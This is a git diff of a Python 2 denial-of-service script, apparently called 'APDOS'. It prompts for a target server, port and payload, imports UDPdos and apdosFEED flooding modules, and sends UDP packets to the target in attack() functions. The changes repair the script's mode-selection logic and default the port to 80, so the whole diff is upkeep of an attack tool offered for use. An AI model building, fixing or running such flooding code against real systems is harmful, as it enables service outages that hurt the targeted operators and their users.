@@ -34,9 +34,11 @@ server = raw_input("[ ] SERVER: ")
 port = raw_input("[ ] PORT: ")
 type = raw_input("[ ] PAYLOAD: ")
 console.set_color()
+if port == '':
+	port = 80
 if type == "skip":
 	type = "0x552810401b"
-	if (version == 'GREAT' or 'great' or 'g' or 'G'):
+	def udp():
 		import UDPdos
 		import console
 		console.set_color(130, 0, 0)
@@ -46,15 +48,32 @@ if type == "skip":
 		print "      -=-+- -+-=-  -=-+- -+-=-"
 		console.set_color()
 		quit()
-	if (version == 'feedbacks' or 'FEEDBACKS' or 'f' or 'F'):
+	def feed():
 		import apdosFEED
 		import console
-		console.set_color()
+		console.set_color(130, 0, 0)
 		print ""
 		print "      -=-+- -+-=-  -=-+- -+-=-"
 		print "         - APDOS COMPLETE -   "
 		print "      -=-+- -+-=-  -=-+- -+-=-"
+		console.set_color()
 		quit()
+	if (version == "GREAT"):
+		udp()
+	if (version == "g"):
+		udp()
+	if (version == "G"):
+		udp()
+	if (version == "great"):
+		udp()
+	if (version == "f"):
+		feed()
+	if (version == "F"):
+		feed()
+	if (version == "feedbacks"):
+		feed()
+	if (version == "FEEDBACKS"):
+		feed()
 	def attack():
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
 		s.sendto(type, (server, int(port)))
@@ -198,7 +217,7 @@ t = threading.Thread(target=animate)
 t.start()
 time.sleep(2)
 donea = True
-if (version == 'GREAT' or 'great' or 'g' or 'G'):
+def udp():
 	import UDPdos
 	import console
 	console.set_color(130, 0, 0)
@@ -208,7 +227,7 @@ if (version == 'GREAT' or 'great' or 'g' or 'G'):
 	print "      -=-+- -+-=-  -=-+- -+-=-"
 	console.set_color()
 	quit()
-if (version == 'feedbacks' or 'FEEDBACKS' or 'f' or 'F'):
+def feed():
 	import apdosFEED
 	import console
 	console.set_color(130, 0, 0)
@@ -218,7 +237,23 @@ if (version == 'feedbacks' or 'FEEDBACKS' or 'f' or 'F'):
 	print "      -=-+- -+-=-  -=-+- -+-=-"
 	console.set_color()
 	quit()
-def attack():  
+if (version == "GREAT"):
+	udp()
+if (version == "g"):
+	udp()
+if (version == "G"):
+	udp()
+if (version == "great"):
+	udp()
+if (version == "f"):
+	feed()
+if (version == "F"):
+	feed()
+if (version == "feedbacks"):
+	feed()
+if (version == "FEEDBACKS"):
+	feed()
+def attack():
 	type = "0x7392a88716b"
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
 	s.sendto(type, (server, int(port)))
